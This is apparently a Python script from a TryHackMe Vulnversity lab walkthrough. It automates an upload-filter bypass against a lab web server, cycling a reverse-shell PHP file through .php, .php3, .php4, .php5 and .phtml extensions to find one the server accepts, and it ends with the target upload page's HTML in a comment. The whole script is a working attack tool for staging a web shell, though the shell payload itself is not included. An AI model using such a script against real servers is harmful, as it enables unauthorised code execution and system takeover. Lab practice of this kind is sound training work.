#!/usr/bin/python3


 
'''
https://www.youtube.com/watch?v=hvYWCegfEZs&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=687s
https://github.com/LegendSpam/VulnVersity/blob/main/ape.py
'''
import requests
import os



print("start ape,py\n===============\n")
ip = "10.10.121.171"    # Get The ip from https://tryhackme.com/room/vulnversity
url = f"http://{ip}:3333/internal/index.php"# This is the upload page 
 

old_filename = "revershall.php" # Name file to upload to the remote 
filename = "revershall"
extensions = [
".php",
".php3",
".php4",
".php5",
".phtml",
]

# find which extension is not allowed . The file extension will be change in the next loop
for ext in extensions:  # Chose a new extension fron the 'extensions' list
    new_filename = filename + ext
    os.rename(old_filename, new_filename)
    print( new_filename)
    files = {"file": open(new_filename, "rb")}
    r = requests.post(url, files=files)
    # r = html of the page
    if "Extension not allowed" in r.text:
       print(f"{ext} not allowed")
    else:
       print(f"{ext} seems to be allowed ?? ")
 
    old_filename = new_filename
   
os.system(f"cp {old_filename} revershall.php")
os.system("ls")    
  
# https://youtu.be/hvYWCegfEZs?list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&t=922



''' ------------- Source code of : ip :3333/internal/index.php  ---------
<html>
<head>
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<style>
html, body {
    height: 30%;
}
html {
    display: table;
    margin: auto;
}
body {
    display: table-cell;
    vertical-align: middle;
    text-align: center;
}
</style>
</head>
<body>
<form action="index.php" method="post" enctype="multipart/form-data">
    <h3>Upload</h3><br />
    <input type="file" name="file" id="file">
    <input class="btn btn-primary" type="submit" value="Submit" name="submit">
</form>
</body>
</html>


'''
